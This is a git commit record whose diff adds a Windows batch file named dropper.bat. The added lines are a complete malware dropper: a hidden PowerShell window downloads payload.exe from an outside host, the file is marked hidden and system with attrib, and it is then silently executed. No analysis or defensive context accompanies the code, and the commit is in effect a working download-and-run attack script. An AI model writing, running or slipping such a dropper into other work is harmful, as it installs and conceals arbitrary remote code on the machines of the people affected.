e76b00223432f5c7d51319bdff09dab41da5824e
Mael Salah <mael0salah.temp@gmail.com>
2025-06-17 15:14:22 +0100

    Update dropper.bat

--- dropper.bat
+++ dropper.bat
@@ -1,1 +1,9 @@
+@echo off
 
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'http://1.1.1.1/payload.exe' -OutFile $env:TEMP\payload.exe"
+
+attrib +h +s "%TEMP%\payload.exe"
+
+start "" /b "%TEMP%\payload.exe"
+
+exit
